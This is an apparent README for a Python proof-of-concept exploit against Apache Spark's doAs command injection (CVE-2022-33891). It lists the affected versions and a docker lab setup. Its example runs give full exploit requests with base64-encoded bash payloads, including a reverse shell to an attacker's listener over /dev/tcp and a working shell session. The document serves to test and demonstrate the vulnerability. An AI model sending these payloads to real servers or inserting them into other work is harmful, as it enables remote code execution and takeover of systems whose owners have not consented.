# CVE-2022-33891
Apache Spark Shell Command Injection Vulnerability

A Python POC for exploiting the Apache Spark Shell Command Injection vulnerability. I saw some other POCs out there but they looked mega sus. This one is clean and simple.

I did not discover this exploit/vulnerability. I just wanted to make a safe POC for the community ^.^

## Affected Versions
Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1

## Vulnerable component
```
http://localhost:8080/?doAs=`[command injection here]`
```
Example
```
echo%20%22c2xlZXAgMTAK%22%20|%20base64%20-d%20|%20bash
```
... sleeps for 10 seconds


## Setup
You need a vulnerable version of Spark that has a single config option changed.

- Install the dependencies: `$ pip3 install -r requirements.txt`
- Use the provided `docker-compose.yml` and run `docker-compose up`. Let the containers spin up.
- In a new terminal, enter `sudo docker exec -it spark_spark_1 /bin/bash`
- In the container bash session, enter: `echo "spark.acls.enable       true" >> conf/spark-defaults.conf`
- Optionally, cat the contents of spark-defaults.conf to make sure it looks good.
- Exit the interactice bash shell and Ctl-C your docker-compose process.
- Once the containers have powered down gracefully, rerun `docker-compose up`


## Usage
```
usage: poc.py [-h] -u URL -p PORT [--revshell] [-lh LISTENINGHOST] [-lp LISTENINGPORT] [--check]

CVE-2022-33891 Python POC Exploit Script

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     URL to exploit.
  -p PORT, --port PORT  Exploit target's port.
  --revshell            Reverse Shell option.
  -lh LISTENINGHOST, --listeninghost LISTENINGHOST
                        Your listening host IP address.
  -lp LISTENINGPORT, --listeningport LISTENINGPORT
                        Your listening host port.
  --check               Checks if the target is exploitable with a sleep test

```

## Examples

Check to see if the target is vulnerable:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080 --check
[*] Attempting to connect to site...
[*] Performing sleep test of 10 seconds...
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgMTA= | base64 -d | bash`
[+] Sleep was 10 seconds! This target is probably vulnerable!
```

Issue commands in a command prompt loop:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080
[*] "Interactive" mode!
[!] Note: you will not receive any output from these commands. Try using something like ping or sleep to test for execution.
> sleep 5
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2xlZXAgNQ== | base64 -d | bash`
> 
```

Execute a reverse shell:
```
husky@dev-kde:~/spark$ python3 poc.py -u http://localhost -p 8080 --revshell -lh 192.168.138.131 -lp 1337
[*] Reverse shell mode.
[*] Set up your listener by entering the following:
 nc -nvlp 1337
[!] When your listener is set up, press enter!
[*] Full exploit request is: http://localhost:8080/?doAs=`echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMzguMTMxLzEzMzcgMD4mMQ== | base64 -d | bash`

...[in the other terminal]...

husky@dev-kde:~/spark$ nc -nvlp 1337
Listening on 0.0.0.0 1337
Connection received on 172.21.0.2 55278
sh: 0: can't access tty; job control turned off
$ whoami
spark
```

## References
- https://securityonline.info/cve-2022-33891-apache-spark-shell-command-injection-vulnerability/
- https://nvd.nist.gov/vuln/detail/CVE-2022-33891
- https://spark.apache.org/docs/2.1.0/configuration.html
- https://github.com/W01fh4cker/cve-2022-33891 (I do not recommend using this POC)

